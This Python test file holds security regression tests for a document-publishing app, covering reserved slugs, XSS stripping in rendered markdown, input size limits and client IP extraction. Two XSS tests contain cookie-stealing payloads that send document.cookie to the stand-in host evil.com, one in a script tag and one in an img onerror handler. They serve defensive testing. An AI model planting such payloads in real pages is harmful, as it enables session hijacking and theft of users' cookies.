"""Security regression tests — SQL injection, JSON-LD injection, reserved slugs, size limits."""

import pytest
from app.services.slug import generate_slug, is_reserved_slug, RESERVED_SLUGS
from app.services.renderer import render_markdown


# --- Reserved slugs ---

def test_reserved_slugs_blocked():
    """All reserved slugs should be detected."""
    for slug in ["about", "admin", "api", "login", "settings", "dashboard"]:
        assert is_reserved_slug(slug), f"{slug} should be reserved"


def test_non_reserved_slug_allowed():
    """Normal slugs should not be blocked."""
    assert not is_reserved_slug("my-research-paper")
    assert not is_reserved_slug("quantum-computing-2026")


def test_generate_slug_appends_doc_suffix_for_reserved():
    """Auto-generated slugs from reserved titles get -doc suffix."""
    slug = generate_slug("About")
    assert slug == "about-doc"


def test_generate_slug_normal_title():
    """Normal titles generate clean slugs."""
    slug = generate_slug("My Research on Quantum Computing")
    assert slug == "my-research-on-quantum-computing"


def test_generate_slug_max_length():
    """Slugs are capped at 80 characters."""
    long_title = "A" * 200
    slug = generate_slug(long_title)
    assert len(slug) <= 80


# --- XSS in rendered HTML ---

def test_script_in_markdown_stripped():
    """Scripts in markdown content must not survive rendering."""
    content = "# Title\n\n<script>document.location='https://evil.com?c='+document.cookie</script>"
    html = render_markdown(content)
    assert "<script>" not in html
    assert "document.cookie" not in html


def test_img_onerror_xss_stripped():
    """img onerror XSS must be stripped."""
    html = render_markdown('# Test\n\n<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">')
    assert "onerror" not in html


# --- Content size validation ---

def test_schema_content_max_length():
    """PublishRequest should reject content exceeding 500K chars."""
    from app.schemas import PublishRequest
    with pytest.raises(Exception):  # ValidationError
        PublishRequest(
            title="Test",
            content="x" * 500_001,
        )


def test_schema_subtitle_max_length():
    """PublishRequest should reject subtitle exceeding 1000 chars."""
    from app.schemas import PublishRequest
    with pytest.raises(Exception):  # ValidationError
        PublishRequest(
            title="Test",
            content="x" * 1000,
            subtitle="x" * 1001,
        )


def test_schema_authors_max_count():
    """PublishRequest should reject more than 20 authors."""
    from app.schemas import PublishRequest, AuthorInfo
    authors = [AuthorInfo(name=f"Author {i}") for i in range(21)]
    with pytest.raises(Exception):  # ValidationError
        PublishRequest(
            title="Test",
            content="x" * 1000,
            authors=authors,
        )


# --- IP detection utility ---

def test_get_client_ip_forwarded():
    """get_client_ip should extract first IP from X-Forwarded-For."""
    from unittest.mock import MagicMock
    from app.utils import get_client_ip

    request = MagicMock()
    request.headers = {"x-forwarded-for": "203.0.113.50, 70.41.3.18, 150.172.238.178"}
    request.client.host = "10.0.0.1"

    assert get_client_ip(request) == "203.0.113.50"


def test_get_client_ip_no_forwarded():
    """get_client_ip should fall back to request.client.host."""
    from unittest.mock import MagicMock
    from app.utils import get_client_ip

    request = MagicMock()
    request.headers = {}
    request.client.host = "192.168.1.100"

    assert get_client_ip(request) == "192.168.1.100"
